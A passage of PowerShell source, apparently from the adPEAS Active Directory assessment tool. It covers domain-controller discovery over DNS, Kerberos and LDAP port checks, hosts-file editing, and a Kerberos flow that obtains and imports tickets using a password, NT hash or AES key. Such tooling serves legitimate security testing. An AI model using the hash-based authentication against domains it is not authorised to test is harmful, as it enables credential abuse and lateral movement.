	    if ($DnsResult -and $DnsResult.AddressList.Count -gt 0) {
	        $ResolvedAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
	        if (-not $ResolvedAddr) {
	            $ResolvedAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' } | Select-Object -First 1
	        }
	        if ($ResolvedAddr) {
	            $ResolvedIP = $ResolvedAddr.IPAddressToString
	            if ($Script:LDAPContext -and $Script:LDAPContext['DnsCache']) {
	                $Script:LDAPContext['DnsCache'][$Hostname] = $ResolvedIP
	            }
	            return $ResolvedIP
	        }
	    }
	}
	catch {
	}
	return $null
}
function Test-DCReachable {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$IP,
	    [Parameter(Mandatory = $false)]
	    [string]$Hostname,
	    [Parameter(Mandatory = $false)]
	    [int]$TimeoutMs = 1000,
	    [Parameter(Mandatory = $false)]
	    [switch]$UseLDAPS
	)
	$DisplayName = if ($Hostname) { "$Hostname ($IP)" } else { $IP }
	$LdapPort = if ($UseLDAPS) { 636 } else { 389 }
	$TestPort = {
	    param([string]$TargetIP, [int]$Port, [int]$Timeout)
	    $client = $null
	    try {
	        $client = New-Object System.Net.Sockets.TcpClient
	        $asyncResult = $client.BeginConnect($TargetIP, $Port, $null, $null)
	        $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($Timeout, $false)
	        if ($waitSuccess) {
	            try {
	                $client.EndConnect($asyncResult)
	                return $client.Connected
	            }
	            catch {
	                return $false
	            }
	        }
	        else {
	            return $false
	        }
	    }
	    catch {
	        return $false
	    }
	    finally {
	        if ($client) {
	            try { $client.Close() } catch { }
	            try { $client.Dispose() } catch { }
	        }
	    }
	}
	$kerberosReachable = & $TestPort $IP 88 $TimeoutMs
	if ($kerberosReachable) {
	    $ldapReachable = & $TestPort $IP $LdapPort $TimeoutMs
	    if ($ldapReachable) {
	        return $true
	    }
	    else {
	        return $false
	    }
	}
	else {
	    return $false
	}
}
function Resolve-SrvRecord {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory = $true)]
	    [string]$Name,
	    [Parameter(Mandatory = $false)]
	    [string]$DnsServer,
	    [Parameter(Mandatory = $false)]
	    [switch]$ReturnAll
	)
	$AllRecords = [System.Collections.Generic.List[PSCustomObject]]::new()
	if ($DnsServer) {
	    try {
	        $DnsResult = Resolve-DnsName -Name $Name -Server $DnsServer -Type SRV -DnsOnly -ErrorAction Stop
	        if ($null -ne $DnsResult) {
	            $SrvRecordsFound = @($DnsResult | Where-Object { $null -ne $_.NameTarget })
	            if ($SrvRecordsFound.Count -gt 0) {
	                $SortedRecords = $SrvRecordsFound | Sort-Object Priority, @{Expression={-$_.Weight}}
	                foreach ($rec in $SortedRecords) {
	                    $AllRecords.Add([PSCustomObject]@{
	                        Target = $rec.NameTarget.TrimEnd('.')
	                        Port = $rec.Port
	                        Priority = $rec.Priority
	                        Weight = $rec.Weight
	                    })
	                }
	                if ($AllRecords.Count -gt 0) {
	                    if ($ReturnAll) { return $AllRecords.ToArray() }
	                    return $AllRecords[0]
	                }
	            }
	        }
	    }
	    catch [System.Management.Automation.CommandNotFoundException] {
	    }
	    catch {
	    }
	    if ($AllRecords.Count -eq 0) {
	        try {
	            $UdpResult = Invoke-RawDnsQuery -Name $Name -DnsServer $DnsServer -Type SRV -ReturnAllSRV:$ReturnAll
	            if ($UdpResult) {
	                if ($UdpResult -is [System.Array]) {
	                    foreach ($rec in $UdpResult) {
	                        $AllRecords.Add($rec)
	                    }
	                    if ($ReturnAll) { return $AllRecords.ToArray() }
	                    return $AllRecords[0]
	                }
	                elseif ($UdpResult.Target) {
	                    return $UdpResult
	                }
	            }
	        }
	        catch {
	        }
	    }
	}
	if ($AllRecords.Count -eq 0) {
	    try {
	        $DnsResult = Resolve-DnsName -Name $Name -Type SRV -DnsOnly -ErrorAction Stop
	        if ($null -ne $DnsResult) {
	            $SrvRecordsFound = @($DnsResult | Where-Object { $null -ne $_.NameTarget })
	            if ($SrvRecordsFound.Count -gt 0) {
	                $SortedRecords = $SrvRecordsFound | Sort-Object Priority, @{Expression={-$_.Weight}}
	                foreach ($rec in $SortedRecords) {
	                    $AllRecords.Add([PSCustomObject]@{
	                        Target = $rec.NameTarget.TrimEnd('.')
	                        Port = $rec.Port
	                        Priority = $rec.Priority
	                        Weight = $rec.Weight
	                    })
	                }
	                if ($AllRecords.Count -gt 0) {
	                    if ($ReturnAll) { return $AllRecords.ToArray() }
	                    return $AllRecords[0]
	                }
	            }
	        }
	    }
	    catch [System.Management.Automation.CommandNotFoundException] {
	    }
	    catch {
	    }
	}
	if ($AllRecords.Count -eq 0) {
	    try {
	        $SystemDnsServer = $null
	        try {
	            $NetworkConfig = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -ErrorAction Stop |
	                Where-Object { $_.DNSServerSearchOrder } | Select-Object -First 1
	            if ($NetworkConfig) { $SystemDnsServer = $NetworkConfig.DNSServerSearchOrder[0] }
	        }
	        catch {
	            $NetworkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue |
	                Where-Object { $_.DNSServerSearchOrder } | Select-Object -First 1
	            if ($NetworkConfig) { $SystemDnsServer = $NetworkConfig.DNSServerSearchOrder[0] }
	        }
	        if ($SystemDnsServer) {
	            $UdpResult = Invoke-RawDnsQuery -Name $Name -DnsServer $SystemDnsServer -Type SRV -ReturnAllSRV:$ReturnAll
	            if ($UdpResult) {
	                if ($UdpResult -is [System.Array]) {
	                    if ($ReturnAll) { return $UdpResult }
	                    return $UdpResult[0]
	                }
	                elseif ($UdpResult.Target) {
	                    return $UdpResult
	                }
	            }
	        }
	    }
	    catch {
	    }
	}
	return $null
}
function Resolve-adPEASName {
	[CmdletBinding(DefaultParameterSetName = 'Name')]
	param(
	    [Parameter(Mandatory = $true, ParameterSetName = 'Name')]
	    [string]$Name,
	    [Parameter(Mandatory = $true, ParameterSetName = 'Domain')]
	    [string]$Domain,
	    [Parameter(Mandatory = $false)]
	    [ValidateScript({
	        if ([string]::IsNullOrEmpty($_)) { return $true }
	        $ip = $null
	        if ([System.Net.IPAddress]::TryParse($_, [ref]$ip)) { return $true }
	        throw "DnsServer must be an IP address, not a hostname: $_"
	    })]
	    [string]$DnsServer,
	    [Parameter(Mandatory = $false)]
	    [switch]$NoCache,
	    [Parameter(Mandatory = $false)]
	    [switch]$UseLDAPS
	)
	process {
	    $EffectiveDnsServer = $DnsServer
	    if (-not $EffectiveDnsServer -and $Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
	        $EffectiveDnsServer = $Script:LDAPContext['DnsServer']
	    }
	    $EffectiveUseLDAPS = $UseLDAPS
	    if (-not $EffectiveUseLDAPS -and $Script:LDAPContext -and $Script:LDAPContext['UseLDAPS']) {
	        $EffectiveUseLDAPS = $true
	    }
	    if ($PSCmdlet.ParameterSetName -eq 'Name') {
	        return Resolve-HostnameToIP -Hostname $Name -DnsServer $EffectiveDnsServer -NoCache:$NoCache
	    }
	    $SrvRecordName = "_ldap._tcp.dc._msdcs.$Domain"
	    $SrvResults = Resolve-SrvRecord -Name $SrvRecordName -DnsServer $EffectiveDnsServer -ReturnAll
	    if ($SrvResults) {
	        if ($SrvResults -isnot [System.Array]) {
	            $SrvResults = @($SrvResults)
	        }
	        foreach ($SrvRecord in $SrvResults) {
	            $DcHostname = $SrvRecord.Target
	            $DcIP = Resolve-HostnameToIP -Hostname $DcHostname -DnsServer $EffectiveDnsServer -NoCache:$NoCache
	            if (-not $DcIP) {
	                continue
	            }
	            if (Test-DCReachable -IP $DcIP -Hostname $DcHostname -UseLDAPS:$EffectiveUseLDAPS) {
	                return [PSCustomObject]@{
	                    Hostname = $DcHostname
	                    IP = $DcIP
	                }
	            }
	            else {
	            }
	        }
	    }
	    if (-not $EffectiveDnsServer) {
	        try {
	            $DnsResult = [System.Net.Dns]::GetHostEntry($Domain)
	            if ($DnsResult -and $DnsResult.AddressList.Count -gt 0) {
	                $DcIPAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
	                if (-not $DcIPAddr) {
	                    $DcIPAddr = $DnsResult.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetworkV6' } | Select-Object -First 1
	                }
	                if (-not $DcIPAddr -and $DnsResult.AddressList.Count -gt 0) {
	                    $DcIPAddr = $DnsResult.AddressList[0]
	                }
	                if ($DcIPAddr) {
	                    $DcIPString = $DcIPAddr.IPAddressToString
	                    $DcHostname = $Domain  # Default to domain name if reverse lookup fails
	                    try {
	                        $ReverseResult = [System.Net.Dns]::GetHostEntry($DcIPAddr)
	                        if ($ReverseResult -and $ReverseResult.HostName -and $ReverseResult.HostName -ne $Domain) {
	                            $DcHostname = $ReverseResult.HostName
	                        }
	                    }
	                    catch {
	                    }
	                    if (Test-DCReachable -IP $DcIPString -Hostname $DcHostname -UseLDAPS:$EffectiveUseLDAPS) {
	                        return [PSCustomObject]@{
	                            Hostname = $DcHostname
	                            IP = $DcIPString
	                        }
	                    }
	                    else {
	                    }
	                }
	            }
	        }
	        catch {
	        }
	    }
	    $DomainIP = Resolve-HostnameToIP -Hostname $Domain -DnsServer $EffectiveDnsServer -NoCache:$NoCache
	    if ($DomainIP) {
	        if (Test-DCReachable -IP $DomainIP -Hostname $Domain -UseLDAPS:$EffectiveUseLDAPS) {
	            return [PSCustomObject]@{
	                Hostname = $Domain
	                IP = $DomainIP
	            }
	        }
	        else {
	        }
	    }
	    return $null
	}
}
$Script:HostsFileMarker = "# adPEAS-managed entry"
$Script:HostsFileMutexName = "Global\adPEAS_HostsFile_Mutex"
$Script:HostsFileMutexTimeoutMs = 5000
$Script:IPAddressPattern = '(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?::[0-9a-fA-F]{1,4}){1,6}|:(?::[0-9a-fA-F]{1,4}){1,7}|::(?:[fF]{4}:)?(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
function Test-adPEASAdminPrivileges {
	[CmdletBinding()]
	param()
	process {
	    return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
	}
}
function Test-ValidHostname {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$Hostname
	)
	process {
	    if ($Hostname.Length -gt 253 -or $Hostname.Length -eq 0) {
	        return $false
	    }
	    $labels = $Hostname.Split('.')
	    foreach ($label in $labels) {
	        if ($label.Length -eq 0 -or $label.Length -gt 63) {
	            return $false
	        }
	        if ($label.StartsWith('-') -or $label.EndsWith('-')) {
	            return $false
	        }
	        if ($label -notmatch '^[a-zA-Z0-9-]+$') {
	            return $false
	        }
	    }
	    return $true
	}
}
function Invoke-WithHostsFileLock {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [scriptblock]$ScriptBlock,
	    [Parameter(Mandatory=$false)]
	    [int]$TimeoutMs = $Script:HostsFileMutexTimeoutMs,
	    [Parameter(Mandatory=$false)]
	    [switch]$ReadOnly
	)
	process {
	    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
	    $mutex = $null
	    $mutexAcquired = $false
	    $fileStream = $null
	    try {
	        $mutex = New-Object System.Threading.Mutex($false, $Script:HostsFileMutexName)
	        $mutexAcquired = $mutex.WaitOne($TimeoutMs)
	        if (-not $mutexAcquired) {
	            throw "Timeout waiting for hosts file lock (another instance may be modifying it)"
	        }
	        $maxRetries = 3
	        $retryDelayMs = 100
	        $lastException = $null
	        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
	            try {
	                if ($ReadOnly) {
	                    $fileStream = [System.IO.File]::Open(
	                        $hostsPath,
	                        [System.IO.FileMode]::Open,
	                        [System.IO.FileAccess]::Read,
	                        [System.IO.FileShare]::Read
	                    )
	                }
	                else {
	                    $fileStream = [System.IO.File]::Open(
	                        $hostsPath,
	                        [System.IO.FileMode]::Open,
	                        [System.IO.FileAccess]::ReadWrite,
	                        [System.IO.FileShare]::None
	                    )
	                }
	                $result = & $ScriptBlock $fileStream
	                return $result
	            }
	            catch [System.IO.IOException] {
	                $lastException = $_
	                if ($attempt -lt $maxRetries) {
	                    Start-Sleep -Milliseconds $retryDelayMs
	                    $retryDelayMs = $retryDelayMs * 2  # Exponential backoff
	                }
	            }
	            finally {
	                if ($fileStream) {
	                    try { $fileStream.Dispose() } catch { }
	                    $fileStream = $null
	                }
	            }
	        }
	        throw "Failed to access hosts file after $maxRetries attempts (file locked): $($lastException.Exception.Message)"
	    }
	    finally {
	        if ($mutexAcquired -and $mutex) {
	            try { $mutex.ReleaseMutex() } catch { }
	        }
	        if ($mutex) {
	            try { $mutex.Dispose() } catch { }
	        }
	    }
	}
}
function Add-adPEASHostsEntry {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$IPAddress,
	    [Parameter(Mandatory=$true)]
	    [string]$Hostname,
	    [Parameter(Mandatory=$false)]
	    [switch]$Force
	)
	process {
	    $Result = [PSCustomObject]@{
	        Success = $false
	        Message = ""
	        RequiresElevation = $false
	        Entry = ""
	    }
	    $entry = "$IPAddress`t$Hostname`t$Script:HostsFileMarker"
	    $ip = $null
	    if (-not [System.Net.IPAddress]::TryParse($IPAddress, [ref]$ip)) {
	        $Result.Message = "Invalid IP address format: $IPAddress"
	        Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	    if (-not (Test-ValidHostname -Hostname $Hostname)) {
	        $Result.Message = "Invalid hostname format: $Hostname (must be valid RFC 1123 hostname)"
	        Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	    if (-not (Test-adPEASAdminPrivileges)) {
	        $Result.RequiresElevation = $true
	        $Result.Message = "Administrator privileges required to modify hosts file"
	        Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	    try {
	        $Result = Invoke-WithHostsFileLock -ScriptBlock {
	            param($fileStream)
	            $innerResult = [PSCustomObject]@{
	                Success = $false
	                Message = ""
	                RequiresElevation = $false
	                Entry = ""
	            }
	            $streamReader = $null
	            $streamWriter = $null
	            try {
	                $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
	                $fullContent = $streamReader.ReadToEnd()
	                $hostsContent = @($fullContent -split "`r?`n")
	                $escapedHostname = [regex]::Escape($Hostname)
	                $existingEntry = $hostsContent | Where-Object { $_ -match "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*" }
	                if ($existingEntry -and -not $Force) {
	                    $innerResult.Message = "Entry for $Hostname already exists. Use -Force to overwrite."
	                    $innerResult.Success = $true  # Not an error, just already exists
	                    return $innerResult
	                }
	                if ($existingEntry -and $Force) {
	                    $hostsContent = @($hostsContent | Where-Object { $_ -notmatch "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*" })
	                }
	                $hostsContent += $entry
	                $streamReader.Dispose()
	                $streamReader = $null
	                $fileStream.SetLength(0)
	                $fileStream.Position = 0
	                $streamWriter = New-Object System.IO.StreamWriter($fileStream, [System.Text.Encoding]::ASCII, 4096, $true)
	                $streamWriter.Write(($hostsContent -join "`r`n"))
	                $streamWriter.Write("`r`n")  # Trailing newline
	                $streamWriter.Flush()
	                $innerResult.Success = $true
	                $innerResult.Entry = $entry
	                $innerResult.Message = "Added hosts entry: $IPAddress -> $Hostname"
	                return $innerResult
	            }
	            finally {
	                if ($streamWriter) { try { $streamWriter.Dispose() } catch { } }
	                if ($streamReader) { try { $streamReader.Dispose() } catch { } }
	            }
	        }
	        if ($Result.Success -and $Result.Entry) {
	            if (-not $Script:LDAPContext) {
	                $Script:LDAPContext = @{}
	            }
	            if (-not $Script:LDAPContext['HostsEntries']) {
	                $Script:LDAPContext['HostsEntries'] = @()
	            }
	            $Script:LDAPContext['HostsEntries'] += $Hostname
	        }
	        return $Result
	    }
	    catch {
	        $Result.Message = "Failed to modify hosts file: $_"
	        Write-Warning "[Add-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	}
}
function Remove-adPEASHostsEntry {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$false)]
	    [string]$Hostname,
	    [Parameter(Mandatory=$false)]
	    [switch]$All
	)
	process {
	    $Result = [PSCustomObject]@{
	        Success = $false
	        Message = ""
	        RemovedCount = 0
	        RequiresElevation = $false
	    }
	    if (-not (Test-adPEASAdminPrivileges)) {
	        $Result.RequiresElevation = $true
	        $Result.Message = "Administrator privileges required to modify hosts file"
	        Write-Warning "[Remove-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	    if (-not $All -and -not $Hostname) {
	        if (-not $Script:LDAPContext -or -not $Script:LDAPContext['HostsEntries'] -or $Script:LDAPContext['HostsEntries'].Count -eq 0) {
	            $Result.Message = "No entries to remove (no tracked entries and no -Hostname/-All specified)"
	            $Result.Success = $true
	            return $Result
	        }
	    }
	    try {
	        $Result = Invoke-WithHostsFileLock -ScriptBlock {
	            param($fileStream)
	            $innerResult = [PSCustomObject]@{
	                Success = $false
	                Message = ""
	                RemovedCount = 0
	                RequiresElevation = $false
	            }
	            $streamReader = $null
	            $streamWriter = $null
	            try {
	                $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
	                $fullContent = $streamReader.ReadToEnd()
	                $hostsContent = @($fullContent -split "`r?`n")
	                $originalCount = $hostsContent.Count
	                if ($All) {
	                    $hostsContent = @($hostsContent | Where-Object { $_ -notmatch [regex]::Escape($Script:HostsFileMarker) })
	                    $innerResult.RemovedCount = $originalCount - $hostsContent.Count
	                    $innerResult.Message = "Removed $($innerResult.RemovedCount) adPEAS-managed entries"
	                }
	                elseif ($Hostname) {
	                    $escapedHostname = [regex]::Escape($Hostname)
	                    $escapedMarker = [regex]::Escape($Script:HostsFileMarker)
	                    $pattern = "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*.*$escapedMarker"
	                    $hostsContent = @($hostsContent | Where-Object { $_ -notmatch $pattern })
	                    $innerResult.RemovedCount = $originalCount - $hostsContent.Count
	                    $innerResult.Message = "Removed entry for $Hostname"
	                }
	                else {
	                    foreach ($trackedHost in $Script:LDAPContext['HostsEntries']) {
	                        $escapedHostname = [regex]::Escape($trackedHost)
	                        $pattern = "^\s*($Script:IPAddressPattern)\s+$escapedHostname\s*"
	                        $hostsContent = @($hostsContent | Where-Object { $_ -notmatch $pattern })
	                    }
	                    $innerResult.RemovedCount = $originalCount - $hostsContent.Count
	                    $Script:LDAPContext['HostsEntries'] = @()
	                    $innerResult.Message = "Removed $($innerResult.RemovedCount) tracked entries"
	                }
	                if ($innerResult.RemovedCount -gt 0) {
	                    $streamReader.Dispose()
	                    $streamReader = $null
	                    $fileStream.SetLength(0)
	                    $fileStream.Position = 0
	                    $streamWriter = New-Object System.IO.StreamWriter($fileStream, [System.Text.Encoding]::ASCII, 4096, $true)
	                    $streamWriter.Write(($hostsContent -join "`r`n"))
	                    $streamWriter.Write("`r`n")  # Trailing newline
	                    $streamWriter.Flush()
	                }
	                $innerResult.Success = $true
	                return $innerResult
	            }
	            finally {
	                if ($streamWriter) { try { $streamWriter.Dispose() } catch { } }
	                if ($streamReader) { try { $streamReader.Dispose() } catch { } }
	            }
	        }
	        return $Result
	    }
	    catch {
	        $Result.Message = "Failed to modify hosts file: $_"
	        Write-Warning "[Remove-adPEASHostsEntry] $($Result.Message)"
	        return $Result
	    }
	}
}
function Get-adPEASHostsEntries {
	[CmdletBinding()]
	param()
	process {
	    try {
	        $entries = Invoke-WithHostsFileLock -ReadOnly -ScriptBlock {
	            param($fileStream)
	            $result = @()
	            $streamReader = $null
	            try {
	                $streamReader = New-Object System.IO.StreamReader($fileStream, [System.Text.Encoding]::ASCII, $true, 4096, $true)
	                $fullContent = $streamReader.ReadToEnd()
	                $hostsContent = @($fullContent -split "`r?`n")
	                foreach ($line in $hostsContent) {
	                    if ($line -match [regex]::Escape($Script:HostsFileMarker)) {
	                        if ($line -match "^\s*($Script:IPAddressPattern)\s+(\S+)\s*") {
	                            $result += [PSCustomObject]@{
	                                IPAddress = $Matches[1]
	                                Hostname = $Matches[2]
	                                Line = $line
	                            }
	                        }
	                    }
	                }
	                return $result
	            }
	            finally {
	                if ($streamReader) { try { $streamReader.Dispose() } catch { } }
	            }
	        }
	        return $entries
	    }
	    catch {
	        Write-Warning "[Get-adPEASHostsEntries] Failed to read hosts file: $_"
	        return @()
	    }
	}
}
function Invoke-KerberosAuthFlow {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$SamAccountName,
	    [Parameter(Mandatory=$true)]
	    [string]$Domain,
	    [Parameter(Mandatory=$false)]
	    [string]$Server,
	    [Parameter(Mandatory=$true)]
	    [string]$DCHostname,
	    [Parameter(Mandatory=$false)]
	    [string]$DCIP,
	    [Parameter(Mandatory=$false)]
	    [string]$Password,
	    [Parameter(Mandatory=$false)]
	    [string]$NTHash,
	    [Parameter(Mandatory=$false)]
	    [string]$AES256Key,
	    [Parameter(Mandatory=$false)]
	    [string]$AES128Key,
	    [Parameter(Mandatory=$false)]
	    [switch]$UseLDAPS,
	    [Parameter(Mandatory=$false)]
	    [switch]$IgnoreSSLErrors,
	    [Parameter(Mandatory=$false)]
	    [string]$UserRealm,
	    [Parameter(Mandatory=$false)]
	    [string]$UserRealmKDC
	)
	begin {
	    function Request-AndImportServiceTicket {
	        param(
	            [Parameter(Mandatory=$true)]
	            [byte[]]$TGTBytes,
	            [Parameter(Mandatory=$true)]
	            [byte[]]$SessionKeyBytes,
	            [Parameter(Mandatory=$true)]
	            [int]$SessionKeyType,
	            [Parameter(Mandatory=$true)]
	            [string]$ServicePrincipalName,
	            [Parameter(Mandatory=$true)]
	            [string]$TargetDomain,
	            [Parameter(Mandatory=$true)]
	            [string]$KdcServer,
	            [Parameter(Mandatory=$true)]
	            [string]$ClientName,
	            [Parameter(Mandatory=$false)]
	            [switch]$NonFatal
	        )
	        $ServiceResult = [PSCustomObject]@{
	            Success = $false
	            TGSResult = $null
	            ImportResult = $null
	            Error = $null
	        }
	        $spnParts = $ServicePrincipalName -split '/'
	        if ($spnParts.Count -lt 2 -or [string]::IsNullOrEmpty($spnParts[1])) {
	            $ServiceResult.Error = "Invalid SPN format: '$ServicePrincipalName' - expected 'service/hostname'"
	            return $ServiceResult
	        }
	        $serviceName = $spnParts[0]
	        $serviceInstance = $spnParts[1]
	        $TGSResult = Request-ServiceTicket -TGT $TGTBytes `
	                                          -SessionKey $SessionKeyBytes `
	                                          -SessionKeyType $SessionKeyType `
	                                          -ServicePrincipalName $ServicePrincipalName `
	                                          -Domain $TargetDomain `
	                                          -DomainController $KdcServer `
	                                          -UserName $ClientName
	        if (-not $TGSResult -or -not $TGSResult.Success) {
	            $ServiceResult.Error = if ($TGSResult.Error) { $TGSResult.Error } else { "TGS request failed" }
	            return $ServiceResult
	        }
	        $ServiceResult.TGSResult = $TGSResult
	        $importParams = @{
	            TicketBytes    = $TGSResult.TicketBytes
	            SessionKey     = $TGSResult.SessionKeyBytes
	            SessionKeyType = $TGSResult.SessionKeyType    # Bug fix: was EncryptionType (ticket etype), must be SessionKeyType
	            Realm          = $TargetDomain.ToUpper()
	            ClientName     = $ClientName
	            ServerName     = $serviceName
	            ServerInstance = $serviceInstance
	        }
	        if ($TGSResult.TicketFlags) { $importParams['TicketFlags'] = $TGSResult.TicketFlags }
	        if ($TGSResult.AuthTime)    { $importParams['AuthTime']    = $TGSResult.AuthTime }
	        if ($TGSResult.StartTime)   { $importParams['StartTime']   = $TGSResult.StartTime }
	        if ($TGSResult.EndTime)     { $importParams['EndTime']     = $TGSResult.EndTime }
	        if ($TGSResult.RenewTill)   { $importParams['RenewTill']   = $TGSResult.RenewTill }
	        $ImportResult = Import-KerberosTicket @importParams
	        if (-not $ImportResult -or -not $ImportResult.Success) {
	            $ServiceResult.Error = if ($ImportResult.Error) { $ImportResult.Error } else { "Ticket import failed" }
	            $ServiceResult.ImportResult = $ImportResult
	            return $ServiceResult
	        }
	        $ServiceResult.ImportResult = $ImportResult
	        $ServiceResult.Success = $true
	        return $ServiceResult
	    }
	}
	process {
	    $Result = [PSCustomObject]@{
	        Success = $false
	        Connection = $null
	        TGTResult = $null
	        Error = $null
	        ErrorCode = $null  # KDC error code for structured error handling
	        IsNetworkError = $false  # True if failure was due to network issues (not auth)
	        NetworkErrorServer = $null
	        NetworkErrorPort = $null
	    }
	    try {
	        $KdcTarget = if ($DCIP) {
	            $DCIP
	        } else {
	            $DCHostname
	        }
	        $IsCrossDomain = $false
	        $TgtKdcTarget = $KdcTarget  # Default: same KDC for everything
	        $TgtRealm = $Domain         # Default: target domain as realm
	        if ($UserRealm -and $UserRealmKDC) {
	            $IsCrossDomain = $true
	            $TgtKdcTarget = $UserRealmKDC  # TGT from user's realm KDC
	            $TgtRealm = $UserRealm         # User's realm for AS-REQ
	        }
	        $KdcReachable = $false
	        try {
	            $TcpClient = New-Object System.Net.Sockets.TcpClient
	            $ConnectTask = $TcpClient.BeginConnect($TgtKdcTarget, 88, $null, $null)
	            $WaitHandle = $ConnectTask.AsyncWaitHandle
	            if ($WaitHandle.WaitOne(2000, $false)) {
	                $TcpClient.EndConnect($ConnectTask)
	                $KdcReachable = $true
	            }
	            $TcpClient.Close()
	        } catch {
	        }
	        if (-not $KdcReachable) {
	            $Result.IsNetworkError = $true
	            $Result.NetworkErrorServer = $TgtKdcTarget
	            $Result.NetworkErrorPort = 88
	            $Result.Error = "Port 88 (Kerberos) unreachable on $TgtKdcTarget"
	            throw $Result.Error
	        }
	        if ($IsCrossDomain -and $KdcTarget -ne $TgtKdcTarget) {
	            $TargetKdcReachable = $false
	            try {
	                $TcpClient2 = New-Object System.Net.Sockets.TcpClient
	                $ConnectTask2 = $TcpClient2.BeginConnect($KdcTarget, 88, $null, $null)
	                $WaitHandle2 = $ConnectTask2.AsyncWaitHandle
	                if ($WaitHandle2.WaitOne(2000, $false)) {
	                    $TcpClient2.EndConnect($ConnectTask2)
	                    $TargetKdcReachable = $true
	                }
	                $TcpClient2.Close()
	            } catch {
	            }
	            if (-not $TargetKdcReachable) {
	            }
	        }
	        if ($IsCrossDomain) {
	        }
	        $KerbAuthParams = @{
	            UserName = $SamAccountName
	            Domain = $TgtRealm           # User's realm (or target domain if same-domain)
	            DomainController = $TgtKdcTarget  # User's realm KDC (or target KDC if same-domain)
	        }
	        if ($PSBoundParameters.ContainsKey('Password')) {
	            $KerbAuthParams['Password'] = $Password
	            $ETypeFallbackOrder = @(18, 17, 23)  # AES256, AES128, RC4-HMAC
	            $ETypeNames = @{ 18 = "AES256"; 17 = "AES128"; 23 = "RC4-HMAC" }
	            $TGTResult = $null
	            $LastErrorCode = $null
	            $LastError = $null
	            foreach ($eType in $ETypeFallbackOrder) {
	                $KerbAuthParams['PreferredEType'] = $eType
	                $TGTResult = Invoke-KerberosAuth @KerbAuthParams
	                if ($TGTResult -and $TGTResult.Success) {
	                    break
	                }
	                if ($TGTResult -and $TGTResult.ErrorCode -eq $Script:KDC_ERR_ETYPE_NOSUPP) {
	                    $LastErrorCode = $TGTResult.ErrorCode
	                    $LastError = $TGTResult.Error
	                    continue
	                }
	                $LastErrorCode = $TGTResult.ErrorCode
	                $LastError = $TGTResult.Error
	                break
	            }
	            if (-not $TGTResult -or -not $TGTResult.Success) {
	                $ErrorMsg = if ($LastError) { $LastError } else { "Unknown error" }
	                $Result.ErrorCode = $LastErrorCode
	                if ($TGTResult -and $TGTResult.IsNetworkError) {
	                    $Result.IsNetworkError = $true
	                    $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
	                    $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
	                }
	                throw "TGT request failed (tried ETypes: AES256, AES128, RC4): $ErrorMsg"
	            }
	        }
	        elseif ($NTHash) {
	            $KerbAuthParams['NTHash'] = $NTHash
	            $TGTResult = Invoke-KerberosAuth @KerbAuthParams
	            if (-not $TGTResult -or -not $TGTResult.Success) {
	                $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
	                $Result.ErrorCode = $TGTResult.ErrorCode
	                if ($TGTResult -and $TGTResult.IsNetworkError) {
	                    $Result.IsNetworkError = $true
	                    $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
	                    $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
	                }
	                throw "TGT request failed: $ErrorMsg"
	            }
	        }
	        elseif ($AES256Key) {
	            $KerbAuthParams['AES256Key'] = $AES256Key
	            $TGTResult = Invoke-KerberosAuth @KerbAuthParams
	            if (-not $TGTResult -or -not $TGTResult.Success) {
	                $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
